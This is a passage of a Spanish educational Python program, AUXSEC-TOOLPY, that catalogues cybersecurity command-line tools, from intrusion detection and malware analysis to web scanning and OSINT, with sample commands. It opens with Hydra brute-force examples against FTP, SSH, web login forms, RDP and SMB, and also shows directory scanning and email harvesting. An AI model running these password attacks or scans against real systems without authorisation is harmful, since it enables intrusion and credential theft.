                "ejemplos_uso": "1. Ataque de fuerza bruta a FTP:\nhydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10\n\n2. Ataque a SSH con múltiples usuarios:\nhydra -L users.txt -p commonpassword ssh://10.10.10.10\n\n3. Ataque a formulario web POST:\nhydra -l admin -P passwords.txt 10.10.10.10 http-post-form '/login.php:username=^USER^&password=^PASS^:Login failed'\n\n4. Ataque a RDP con límite de intentos:\nhydra -t 1 -V -f -l administrator -P passwords.txt rdp://10.10.10.10\n\n5. Ataque a SMB con especificación de dominio:\nhydra -l administrator -P passwords.txt -m 'workgroup' smb://10.10.10.10",
                "documentation": "Para obtener información más detallada sobre Hydra, consulte la documentación oficial en https://github.com/vanhauser-thc/thc-hydra"
            }
        }
    },

    "7": {
        "name": "Monitoreo y Detección de Intrusiones",
        "description": "Herramientas para monitorear redes y sistemas, detectar actividades sospechosas y prevenir intrusiones.",
        "submodules": {
            "7.1": {
                "name": "Suricata",
                "description": "Suricata es un motor de detección de amenazas de red de alto rendimiento y de código abierto. Funciona como un sistema de detección de intrusiones (IDS), sistema de prevención de intrusiones (IPS) y monitor de seguridad de red (NSM).",
                "requisitos": "Compatible con sistemas Linux, FreeBSD, y Windows. Requiere al menos 4 GB de RAM y un procesador multi-núcleo para un rendimiento óptimo. Se recomienda ejecutar con privilegios de root/administrador.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["suricata -c", "Especifica el archivo de configuración", "suricata -c /etc/suricata/suricata.yaml"],
                    ["suricata -i", "Especifica la interfaz de red a monitorear", "suricata -i eth0"],
                    ["suricata -r", "Lee paquetes de un archivo pcap", "suricata -r captura.pcap"],
                    ["suricata-update", "Actualiza las reglas de Suricata", "suricata-update"],
                    ["suricata -T", "Prueba la configuración sin iniciar el motor", "suricata -T -c /etc/suricata/suricata.yaml"]
                ],
                "ejemplos_uso": "1. Iniciar Suricata en modo IDS:\nsuricata -c /etc/suricata/suricata.yaml -i eth0\n\n2. Analizar un archivo pcap:\nsuricata -c /etc/suricata/suricata.yaml -r captura.pcap\n\n3. Actualizar las reglas de Suricata:\nsuricata-update\n\n4. Verificar la configuración:\nsuricata -T -c /etc/suricata/suricata.yaml -v\n\n5. Ejecutar Suricata en modo daemon:\nsuricata -c /etc/suricata/suricata.yaml -i eth0 -D",
                "documentation": "Para obtener información más detallada sobre Suricata, consulte la documentación oficial en https://suricata.readthedocs.io/"
            },
            "7.2": {
                "name": "OSSEC",
                "description": "OSSEC (Open Source HIDS SECurity) es un sistema de detección de intrusiones basado en host (HIDS) de código abierto. Realiza análisis de registros, verificación de integridad, monitoreo del registro de Windows, detección de rootkits, alertas en tiempo real y respuesta activa.",
                "requisitos": "Compatible con sistemas Unix/Linux, Windows y macOS. Requiere al menos 1 GB de RAM y 50 MB de espacio en disco. Se recomienda ejecutar con privilegios de root/administrador.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["ossec-control start", "Inicia el servicio OSSEC", "sudo ossec-control start"],
                    ["ossec-control stop", "Detiene el servicio OSSEC", "sudo ossec-control stop"],
                    ["ossec-control restart", "Reinicia el servicio OSSEC", "sudo ossec-control restart"],
                    ["ossec-logtest", "Prueba la configuración de reglas", "sudo ossec-logtest"],
                    ["/var/ossec/bin/manage_agents", "Gestiona los agentes OSSEC", "sudo /var/ossec/bin/manage_agents"]
                ],
                "ejemplos_uso": "1. Iniciar OSSEC:\nsudo /var/ossec/bin/ossec-control start\n\n2. Agregar un nuevo agente:\nsudo /var/ossec/bin/manage_agents\n\n3. Verificar el estado de OSSEC:\nsudo /var/ossec/bin/ossec-control status\n\n4. Analizar un archivo de registro específico:\nsudo /var/ossec/bin/ossec-logtest -f /var/log/auth.log\n\n5. Ver las alertas en tiempo real:\nsudo tail -f /var/ossec/logs/alerts/alerts.log",
                "documentation": "Para obtener información más detallada sobre OSSEC, consulte la documentación oficial en https://www.ossec.net/docs/"
            },
            "7.3": {
                "name": "Fail2Ban",
                "description": "Fail2Ban es una herramienta de seguridad que monitorea los registros del sistema y toma medidas contra las direcciones IP que muestran signos de actividad maliciosa, como múltiples intentos fallidos de autenticación.",
                "requisitos": "Compatible con sistemas Unix/Linux. Requiere Python 3.x y privilegios de root para su ejecución.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["fail2ban-client start", "Inicia el servicio Fail2Ban", "sudo fail2ban-client start"],
                    ["fail2ban-client stop", "Detiene el servicio Fail2Ban", "sudo fail2ban-client stop"],
                    ["fail2ban-client status", "Muestra el estado de Fail2Ban", "sudo fail2ban-client status"],
                    ["fail2ban-client set JAIL banip IP", "Banea manualmente una IP", "sudo fail2ban-client set sshd banip 192.168.1.100"],
                    ["fail2ban-client set JAIL unbanip IP", "Desbanea manualmente una IP", "sudo fail2ban-client set sshd unbanip 192.168.1.100"]
                ],
                "ejemplos_uso": "1. Iniciar Fail2Ban:\nsudo systemctl start fail2ban\n\n2. Verificar el estado de una jaula específica:\nsudo fail2ban-client status sshd\n\n3. Banear manualmente una IP:\nsudo fail2ban-client set sshd banip 192.168.1.100\n\n4. Desbanear manualmente una IP:\nsudo fail2ban-client set sshd unbanip 192.168.1.100\n\n5. Ver los registros de Fail2Ban:\nsudo tail -f /var/log/fail2ban.log",
                "documentation": "Para obtener información más detallada sobre Fail2Ban, consulte la documentación oficial en https://www.fail2ban.org/wiki/index.php/Main_Page"
            }
        }
    },

    "8": {
        "name": "Análisis de Malware",
        "description": "Herramientas para analizar y comprender el comportamiento de software malicioso, detectar patrones y realizar ingeniería inversa.",
        "submodules": {
            "8.1": {
                "name": "Cuckoo Sandbox",
                "description": "Cuckoo Sandbox es un sistema automatizado de análisis de malware. Permite ejecutar y analizar archivos sospechosos en un entorno aislado, recopilando información detallada sobre su comportamiento.",
                "requisitos": "Compatible con sistemas Linux. Requiere Python, virtualización (como VirtualBox) y máquinas virtuales configuradas como 'guests'. Se recomienda un sistema con al menos 4GB de RAM y espacio en disco suficiente para almacenar resultados.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["cuckoo", "Inicia el servidor Cuckoo", "cuckoo"],
                    ["cuckoo submit", "Envía un archivo para análisis", "cuckoo submit malware.exe"],
                    ["cuckoo web", "Inicia la interfaz web de Cuckoo", "cuckoo web"],
                    ["cuckoo clean", "Limpia los análisis antiguos", "cuckoo clean"],
                    ["cuckoo machine list", "Lista las máquinas virtuales disponibles", "cuckoo machine list"]
                ],
                "ejemplos_uso": "1. Iniciar Cuckoo Sandbox:\ncuckoo\n\n2. Enviar un archivo para análisis:\ncuckoo submit /path/to/suspicious_file.exe\n\n3. Analizar una URL:\ncuckoo submit --url http://suspicious-url.com\n\n4. Generar un reporte en formato JSON:\ncuckoo submit --json /path/to/malware.exe\n\n5. Usar una máquina virtual específica:\ncuckoo submit --machine win7x64 malware.exe",
                "documentation": "Para obtener información más detallada sobre Cuckoo Sandbox, consulte la documentación oficial en https://cuckoo.sh/docs/"
            },
            "8.2": {
                "name": "Yara",
                "description": "Yara es una herramienta diseñada para ayudar a los investigadores de malware a identificar y clasificar muestras de malware. Permite crear reglas basadas en patrones textuales o binarios para detectar malware o cualquier tipo de archivo sospechoso.",
                "requisitos": "Compatible con sistemas Windows, Linux y macOS. Requiere compilación desde el código fuente o instalación mediante gestores de paquetes. No necesita privilegios especiales para su ejecución básica.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["yara [regla] [archivo/directorio]", "Aplica una regla a un archivo o directorio", "yara mi_regla.yar archivo_sospechoso.exe"],
                    ["yara -r", "Escanea recursivamente un directorio", "yara -r mi_regla.yar /directorio/sospechoso"],
                    ["yara -c", "Cuenta el número de coincidencias", "yara -c mi_regla.yar archivo.bin"],
                    ["yara -s", "Muestra las cadenas coincidentes", "yara -s mi_regla.yar malware.exe"],
                    ["yara -m", "Incluye metadatos en la salida", "yara -m mi_regla.yar archivo.dll"]
                ],
                "ejemplos_uso": "1. Crear una regla Yara básica:\nrule DetectMalware {\n    strings:\n        $suspicious_string = \"malware_function\"\n    condition:\n        $suspicious_string\n}\n\n2. Aplicar una regla a un archivo:\nyara mi_regla.yar archivo_sospechoso.exe\n\n3. Escanear un directorio recursivamente:\nyara -r reglas/ directorio_sospechoso/\n\n4. Combinar múltiples reglas:\nyara regla1.yar regla2.yar regla3.yar archivo.bin\n\n5. Usar variables externas:\nyara -d filename=sospechoso.exe regla_con_variables.yar .",
                "documentation": "Para obtener información más detallada sobre Yara, consulte la documentación oficial en https://yara.readthedocs.io/"
            },
            "8.3": {
                "name": "Radare2",
                "description": "Radare2 es un framework de ingeniería inversa y análisis de binarios. Proporciona un conjunto de herramientas para desensamblar, depurar, analizar y manipular archivos binarios.",
                "requisitos": "Compatible con sistemas Unix/Linux, Windows y macOS. Se puede instalar desde los repositorios de la mayoría de las distribuciones Linux o compilar desde el código fuente. No requiere privilegios especiales para su uso básico.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["r2", "Inicia Radare2", "r2 programa.exe"],
                    ["aaa", "Analiza todo el programa", "aaa"],
                    ["pdf @main", "Desensambla la función main", "pdf @main"],
                    ["iz", "Lista las cadenas del binario", "iz"],
                    ["db 0x1234", "Establece un breakpoint", "db 0x1234"]
                ],
                "ejemplos_uso": "1. Abrir un binario en modo análisis:\nr2 -A programa.exe\n\n2. Buscar cadenas en el binario:\n[0x00000000]> iz\n\n3. Desensamblar una función específica:\n[0x00000000]> pdf @sym.main\n\n4. Buscar referencias a una cadena:\n[0x00000000]> axt @str.password\n\n5. Generar un gráfico de flujo de una función:\n[0x00000000]> agf @main > grafico_main.dot",
                "documentation": "Para obtener información más detallada sobre Radare2, consulte la documentación oficial en https://book.rada.re/"
            }
        }
    },

    "9": {
        "name": "Seguridad de Aplicaciones Web",
        "description": "Herramientas para evaluar y mejorar la seguridad de aplicaciones web, incluyendo escáneres de vulnerabilidades y herramientas de descubrimiento de contenido.",
        "submodules": {
            "9.1": {
                "name": "OWASP ZAP (versión CLI)",
                "description": "OWASP Zed Attack Proxy (ZAP) es una herramienta de pruebas de penetración de código abierto diseñada específicamente para aplicaciones web. La versión CLI permite la automatización de escaneos de seguridad y su integración en flujos de trabajo de desarrollo continuo.",
                "requisitos": "Java Runtime Environment (JRE) 8 o superior. Compatible con sistemas Windows, Linux y macOS. Se recomienda al menos 4GB de RAM para un rendimiento óptimo.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["zap-cli start", "Inicia el daemon de ZAP", "zap-cli start"],
                    ["zap-cli quick-scan", "Realiza un escaneo rápido de una URL", "zap-cli quick-scan --self-contained -o '-config api.key=12345' -s xss,sqli http://example.com"],
                    ["zap-cli active-scan", "Ejecuta un escaneo activo", "zap-cli active-scan -r http://example.com"],
                    ["zap-cli report", "Genera un informe de los resultados", "zap-cli report -o report.html -f html"],
                    ["zap-cli shutdown", "Cierra el daemon de ZAP", "zap-cli shutdown"]
                ],
                "ejemplos_uso": "1. Iniciar ZAP y realizar un escaneo rápido:\nzap-cli start\nzap-cli quick-scan http://example.com\n\n2. Ejecutar un escaneo activo con reglas específicas:\nzap-cli active-scan -r http://example.com --scanners xss,sqli\n\n3. Generar un informe en formato HTML:\nzap-cli report -o informe.html -f html\n\n4. Realizar un escaneo completo y generar un informe:\nzap-cli quick-scan --self-contained -o '-config api.key=12345' http://example.com\nzap-cli report -o informe.html -f html\nzap-cli shutdown",
                "documentation": "Para obtener información más detallada sobre OWASP ZAP CLI, consulte la documentación oficial en https://www.zaproxy.org/docs/desktop/cmdline/"
            },
            "9.2": {
                "name": "Wapiti",
                "description": "Wapiti es un escáner de vulnerabilidades de aplicaciones web de código abierto. Permite auditar la seguridad de sitios web o aplicaciones web mediante la realización de ataques de caja negra.",
                "requisitos": "Python 3.7 o superior. Compatible con sistemas Unix/Linux, Windows y macOS. No requiere privilegios de root para la mayoría de las operaciones.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["wapiti -u", "Especifica la URL objetivo", "wapiti -u http://example.com"],
                    ["wapiti --scope", "Define el alcance del escaneo", "wapiti -u http://example.com --scope url"],
                    ["wapiti -m", "Selecciona módulos específicos", "wapiti -u http://example.com -m sql,xss"],
                    ["wapiti -f", "Especifica el formato del informe", "wapiti -u http://example.com -f html"],
                    ["wapiti --auth-method", "Configura la autenticación", "wapiti -u http://example.com --auth-method basic"]
                ],
                "ejemplos_uso": "1. Escaneo básico de un sitio web:\nwapiti -u http://example.com\n\n2. Escaneo con módulos específicos:\nwapiti -u http://example.com -m sql,xss,ssrf\n\n3. Generar un informe en formato HTML:\nwapiti -u http://example.com -f html -o informe.html\n\n4. Escaneo con autenticación:\nwapiti -u http://example.com --auth-method basic --auth-credentials usuario:contraseña\n\n5. Escaneo con alcance limitado:\nwapiti -u http://example.com --scope url -d 3",
                "documentation": "Para obtener información más detallada sobre Wapiti, consulte la documentación oficial en https://wapiti.sourceforge.io/"
            },
            "9.3": {
                "name": "Dirb",
                "description": "Dirb es un escáner de contenido web diseñado para buscar objetos web existentes y/o ocultos. Utiliza un ataque basado en diccionario para descubrir directorios y archivos en servidores web.",
                "requisitos": "Compatible con sistemas Unix/Linux. No requiere instalación adicional en la mayoría de las distribuciones Linux orientadas a seguridad. Se recomienda tener listas de palabras actualizadas.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["dirb <url>", "Escaneo básico de una URL", "dirb http://example.com"],
                    ["dirb <url> <wordlist>", "Usa una lista de palabras específica", "dirb http://example.com /path/to/wordlist.txt"],
                    ["dirb <url> -X <extensions>", "Busca archivos con extensiones específicas", "dirb http://example.com -X .php,.txt"],
                    ["dirb <url> -o <file>", "Guarda la salida en un archivo", "dirb http://example.com -o output.txt"],
                    ["dirb <url> -r", "No busca recursivamente", "dirb http://example.com -r"]
                ],
                "ejemplos_uso": "1. Escaneo básico de un sitio web:\ndirb http://example.com\n\n2. Usar una lista de palabras personalizada:\ndirb http://example.com /usr/share/wordlists/dirb/big.txt\n\n3. Buscar archivos PHP y de texto:\ndirb http://example.com -X .php,.txt\n\n4. Escaneo no recursivo y guardar resultados:\ndirb http://example.com -r -o resultados.txt\n\n5. Escaneo con autenticación básica:\ndirb http://example.com -u admin:password",
                "documentation": "Para obtener información más detallada sobre Dirb, consulte la documentación incluida en el paquete o en https://tools.kali.org/web-applications/dirb"
            }
        }
    },

    "10": {
        "name": "Recopilación de Información (OSINT)",
        "description": "Herramientas para la recolección de información de fuentes abiertas, útiles en la fase de reconocimiento de pruebas de penetración y análisis de seguridad.",
        "submodules": {
            "10.1": {
                "name": "theHarvester",
                "description": "theHarvester es una herramienta diseñada para recopilar correos electrónicos, subdominios, hosts, nombres de empleados, puertos abiertos y banners de múltiples fuentes públicas como motores de búsqueda, servidores PGP y bases de datos.",
                "requisitos": "Compatible con sistemas Unix/Linux. Requiere Python 3.x. No necesita privilegios de root para la mayoría de las funciones, pero algunas pueden requerir permisos elevados.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["theHarvester -d", "Especifica el dominio objetivo", "theHarvester -d ejemplo.com"],
                    ["theHarvester -l", "Limita el número de resultados", "theHarvester -d ejemplo.com -l 100"],
                    ["theHarvester -b", "Especifica las fuentes de búsqueda", "theHarvester -d ejemplo.com -b google,bing"],
                    ["theHarvester -f", "Guarda los resultados en un archivo", "theHarvester -d ejemplo.com -f resultados.html"],
                    ["theHarvester -n", "Realiza búsqueda de DNS", "theHarvester -d ejemplo.com -n"]
                ],
                "ejemplos_uso": "1. Búsqueda básica de un dominio:\ntheHarvester -d ejemplo.com -l 500 -b google\n\n2. Búsqueda en múltiples fuentes:\ntheHarvester -d ejemplo.com -b google,bing,linkedin\n\n3. Búsqueda con resolución DNS:\ntheHarvester -d ejemplo.com -b all -n\n\n4. Guardar resultados en formato HTML:\ntheHarvester -d ejemplo.com -b all -f informe.html\n\n5. Búsqueda de correos electrónicos específica:\ntheHarvester -d ejemplo.com -b linkedin -l 200",
                "documentation": "Para obtener información más detallada sobre theHarvester, consulte la documentación oficial en https://github.com/laramies/theHarvester"
            },
            "10.2": {
                "name": "Maltego (versión CLI)",
                "description": "Maltego es una herramienta de minería de datos que permite recopilar y conectar información de diversas fuentes para crear gráficos de relaciones. La versión CLI permite automatizar estas tareas desde la línea de comandos.",
                "requisitos": "Requiere una licencia válida de Maltego. Compatible con sistemas que soporten Java. Necesita conexión a Internet para acceder a las transformaciones en línea.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["maltego -run", "Ejecuta una transformación", "maltego -run 'Domain To IP' -w output.mtz"],
                    ["maltego -import", "Importa un archivo de Maltego", "maltego -import input.mtz"],
                    ["maltego -export", "Exporta resultados", "maltego -export output.csv"],
                    ["maltego -list", "Lista transformaciones disponibles", "maltego -list transforms"],
                    ["maltego -config", "Configura opciones de Maltego", "maltego -config set proxy.host 127.0.0.1"]
                ],
                "ejemplos_uso": "1. Ejecutar una transformación sobre un dominio:\nmaltego -run 'Domain To IP' -w output.mtz -p domain=ejemplo.com\n\n2. Importar un archivo y ejecutar una transformación:\nmaltego -import input.mtz -run 'Email Address to Social Networks' -w output.mtz\n\n3. Exportar resultados en formato CSV:\nmaltego -import results.mtz -export output.csv\n\n4. Listar todas las transformaciones disponibles:\nmaltego -list transforms\n\n5. Configurar un proxy para las conexiones:\nmaltego -config set proxy.host 127.0.0.1 -config set proxy.port 8080",
                "documentation": "Para obtener información más detallada sobre Maltego CLI, consulte la documentación oficial en https://docs.maltego.com/support/solutions/articles/15000019382-maltego-ce-cli-local-transforms"
            },
            "10.3": {
                "name": "Recon-ng",
                "description": "Recon-ng es un framework de reconocimiento web que proporciona un entorno poderoso para realizar recopilación de información de código abierto (OSINT) y análisis.",
                "requisitos": "Compatible con sistemas Unix/Linux. Requiere Python 3.x. No necesita privilegios de root para la mayoría de las funciones, pero algunas pueden requerir permisos elevados.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["workspaces create", "Crea un nuevo espacio de trabajo", "workspaces create mi_proyecto"],
                    ["modules search", "Busca módulos disponibles", "modules search google"],
                    ["modules load", "Carga un módulo específico", "modules load recon/domains-hosts/google_site_web"],
                    ["options set", "Configura opciones del módulo", "options set SOURCE ejemplo.com"],
                    ["run", "Ejecuta el módulo cargado", "run"]
                ],
                "ejemplos_uso": "1. Crear un nuevo espacio de trabajo e iniciar la recopilación:\nworkspaces create mi_proyecto\nmodules load recon/domains-hosts/bing_domain_web\noptions set SOURCE ejemplo.com\nrun\n\n2. Buscar y usar un módulo específico:\nmodules search google\nmodules load recon/domains-hosts/google_site_web\noptions set SOURCE ejemplo.com\nrun\n\n3. Exportar los resultados:\nmodules load reporting/csv\noptions set FILENAME /tmp/resultados.csv\nrun\n\n4. Realizar un escaneo completo con múltiples módulos:\nworkspaces create escaneo_completo\nmodules load recon/domains-hosts/hackertarget\noptions set SOURCE ejemplo.com\nrun\nmodules load recon/hosts-hosts/resolve\nrun\n\n5. Usar una API key para módulos que lo requieran:\nkeys add shodan_api TU_API_KEY_AQUI\nmodules load recon/hosts-ports/shodan_ip\noptions set SOURCE 8.8.8.8\nrun",
                "documentation": "Para obtener información más detallada sobre Recon-ng, consulte la documentación oficial en https://github.com/lanmaster53/recon-ng/wiki"
            }
        }
    }
}
# Facilitar el accedo a las claves del diccionario para considerar opciones como ayuda o salir
module_index = list(modules.keys())

#Funcion para resetear la pantalla mientras se pasa de un menú a otro con compatibilidad con el comando cls (windows) y clear (requiere librería os).
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
	
	
#Funcion par mostrar el menú principal de inicio, enumerando los campos de estudio y las opciones de ayuda y para salir.
def show_main_menu():
    clear_screen()
    print("-------------------------------")
    print("Menú Principal de AUXSEC-TOOLPY")
    print("------------oOOOo--------------")
    print("Los campos relacionados con la ciberseguridad son los siguientes")
    for key, module in modules.items():
        print(f"   {key}. {module['name']}")
    print("------------oOOOo--------------\n")
    print("Si quiere una definición del campo escriba: \"ayuda\" seguida del nombre del campo.\n")
    print("Si quiere salir pulse Ctrl+C durante cualquier momento de la ejecución del programa, o escriba \"Salir\" mientras se encuentre en este menú principal.\n\n")


#Función para mostrar el menú de las herramientas (programas) disponibles en cada campo.
def show_module_menu(module):
    clear_screen()
    print(f"Módulo: {module['name']}\n")
    print("Submodulos:")
    for code, submodule in module['submodules'].items():
        print(f"{code}. {submodule['name']}")
    print("\nv. Volver al menú principal\n")
	
	
#Función para mostrar el menú de la herramienta (programa) seleccionada.
def show_submodule_menu(submodule):
    clear_screen()
    print(f"Submódulo: {submodule['name']}\n")
    print("1. Descripción general.")
    print("2. Requisitos")
    print("3. Comandos y ejemplos de uso")
    print("4. Documentación oficial")
    print("\nv. Volver al menú del módulo\n")
#Logos y aviso:

logo = """
==========================================================--====================
=======================================================-.   .-==================
===========================-:.-==-.-================-.         .:-==============
===================-::===-.   :==:   :==========-:.               .:--==========
================-.  .===:     -==:   -=====--..         .---:.        ..:--=====
==============:    :===:      -==:   ===:.          .:-=======-:.           :===
==============:.  .===:       -==:   ===.       .:-====-     -====-:.        -==
==========::-===-:===:        -==:   -==.    .-=====-           --====-:    .===
=========.   .-======.        :==:   :==:    .===:.                :===:    .===
=======-        :=======--::..-==-..:-==-     -==:                 .==-     -===
======-         :==-::-==================.    .===.                -==:    .====
=====-         .===.     ....:-==-::..:==-     :==-               -==-     -====
=====.         :==-           :==:     -==:     -==-.            -==-     :=====
====-          -==:           :==:     .-==:     :===:         .===-     .======
====.          -==:           :==:      .===:     .-==-.     .-===:     .=======
===-           ===.           :==:       .-==:      :===-:..-===:      :========
====..........:===:...........-==-........:===-.      :-======:.     .-=========
====++++++++++=====+++++++======================-.      .---.       :===========
====                                                                ============
======       █████╗ ██╗   ██╗██╗  ██╗███████╗███████╗ ██████╗       ============   
======      ██╔══██╗██║   ██║╚██╗██╔╝██╔════╝██╔════╝██╔════╝                  =
=======     ███████║██║   ██║ ╚███╔╝ ███████╗█████╗  ██║          ██████╗    ===
========    ██╔══██║██║   ██║ ██╔██╗ ╚════██║██╔══╝  ██║          ╚═════╝    ===
========    ██║  ██║╚██████╔╝██╔╝ ██╗███████║███████╗╚██████╗                ===
========    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝         ==========
========                                                            ============
========    ████████╗ ██████╗  ██████╗ ██╗     ██████╗ ██╗   ██╗    ============
========    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔══██╗╚██╗ ██╔╝    ============
========       ██║   ██║   ██║██║   ██║██║     ██████╔╝ ╚████╔╝     ============
========       ██║   ██║   ██║██║   ██║██║     ██╔═══╝   ╚██╔╝      ============
========       ██║   ╚██████╔╝╚██████╔╝███████╗██║        ██║       ============
========       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝        ╚═╝       ============
========                                                            ============
========----------------     Asentando las bases    ----------------============
========                                                            ============
========    Versión: 1.0 | Autor: Pablo Fernández Sosa | 23-01-2025    =========
================================================================================

    AUXSEC-TOOLPY es una herramienta diseñada con una finalidad didáctica para 
introducir al personal interesado en la ciberseguridad en el uso de potentes 
herramientas basadas en el CLI (Interfaces de Línea de Comandos). 

    Dada la gran potencia de la mayoría de herramientas, este programa se limita
a clasificarlas según el campo para el que puede tener mayor potencial y a enume-
rar requerimientos para su uso. Adicionalmente se facilita una breve guía de los 
comandos que se han considerado más prácticos, algún ejemplo y la documentación
oficial.

    Se les mostrará 10 campos para que elijan el de interés. Una vez seleccionado 
el campo podrán acceder a la documentación de cada herramienta.

    Cualquier fallo o sugerencia contacten con el autor del programa para mejorar
futuras versiones.

---------------------------------------------------------------------------------

"""
aviso='''
-----------
Aviso Legal
-----------
AUXSEC-TOOLPY es una herramienta educativa y de referencia. Todos los programas,
herramientas y marcas mencionadas son propiedad de sus respectivos autores y 
organizaciones.

La información proporcionada es solo para fines educativos y de investigación.
 -  El autor del programa no tiene afiliación oficial con ninguna de las 
    herramientas descritas.
 -  La información se obtiene de fuentes públicas y documentación oficial.
 -  El uso de las herramientas descritas debe realizarse únicamente con 
    autorización explícita y en entornos controlados.
 -  El autor no se hace responsable del mal uso de la información o las 
    herramientas descritas.

Advertencia de Responsabilidad:
El uso de herramientas de ciberseguridad sin la debida autorización puede ser ilegal
y antiético. Siempre obtenga permiso antes de realizar cualquier prueba de seguridad.
__________________________________________________________
©2025 Pablo Fernández Sosa. Todos los derechos reservados.
-->

'''

#Ejecucion de main
def main():
   
    while True:

        show_main_menu()
        choice = input("Selecciona una opción: ").lower()

        if choice in module_index or any(m['name'].lower().startswith(choice.lower()) for m in modules.values()):
            module_choice = choice
            selected_module = next((m for m in modules.values() if m['name'].lower() == module_choice.lower() or modules.get(module_choice) == m), None)

            
            if selected_module:
                while True:
                    show_module_menu(selected_module)
                    submodule_choice = input("Selecciona un submódulo o 'v' para volver: ").lower()
                    
                    if submodule_choice == 'v':
                        break
                    
                    selected_submodule = selected_module['submodules'].get(submodule_choice) or next((sm for sm in selected_module['submodules'].values() if sm['name'].lower() == submodule_choice), None)
                    
                    if selected_submodule:
                        while True:
                            show_submodule_menu(selected_submodule)
                            submodule_action = input("Selecciona una opción: ").lower()
                            
                            if submodule_action == '1':
                                print(f"\nDescripción general:\n {selected_submodule['description']}\n")
                                input("\nPresiona Enter para continuar...")
                            elif submodule_action == '2':
                                print(f"\nRequsisitos: {selected_submodule['requisitos']}\n")
                                input("\nPresiona Enter para continuar...")
                            elif submodule_action == '3':
                                tabla_comandos = selected_submodule.get('tabla_comandos')
                                if tabla_comandos:
                                    print(f"\nComandos y ejemplos de uso de {selected_submodule['name']}\n")
                                    formatted_table = tabulate(tabla_comandos[1:], headers=tabla_comandos[0], tablefmt="grid")
                                    print(formatted_table)
                                else:
                                    print("No hay tabla de comandos disponible para este submódulo.")
                                
                                ejemplos_uso = selected_submodule.get('ejemplos_uso')
                                if ejemplos_uso:
                                    print("\nEjemplos de uso:")
                                    print(ejemplos_uso)
                                else:
                                    print("No hay ejemplos de uso disponibles para este submódulo.")
                                
                                input("\nPresiona Enter para continuar...")
                            elif submodule_action == '4':
                                print(f"\nDocumentación oficial: {selected_submodule['documentation']}")
                                input("\nPresiona Enter para continuar...")
                            elif submodule_action == 'v':
                                break
                            else:
                                print("Opción no válida. Intenta de nuevo.")
                    else:
                        print("Submódulo no válido. Intenta de nuevo.")
            else:
                print("Módulo no válido. Intenta de nuevo.")
                input("\nPresiona Enter para continuar...")

	#Desarrollo de la opción ayuda para consultar la definición de cada campo.

        elif choice.startswith("ayuda"):
            if len(choice.split()) > 1:
                #Quito ayuda de la variable para trabajar con el módulo elegido de la misma manera que antes
                module_choice = choice[6:]
                selected_module = next((m for m in modules.values() if m['name'].lower() == module_choice.lower() or modules.get(module_choice) == m), None)
                
                if selected_module:
                    print(f"\nAyuda para {selected_module['name']}:")
                    print(selected_module['description'])
                else:
                    print("Módulo no encontrado.")
            else:
                print("Por favor, escriba 'ayuda' seguido del número o nombre del módulo.")
            
            input("\nPresiona Enter para continuar...")

	#Desarrollo de la opción salir parasalir del programa.
        elif choice == "salir":
            print("!Gracias por utilizar AUXSEC-TOOLPY!¡Hasta luego!")
            break
			
	#Desarrollo por si se introduce una opción no correcta.
        else:
            print("Opción no válida. Intenta de nuevo.")
            input("\nPresiona Enter para continuar...")


#Inicialización del programa
if __name__ == "__main__":
    print(aviso)
    input("\nPresiona Enter para continuar...")
    print(logo)
    input("\nPresiona Enter para continuar...")
    main()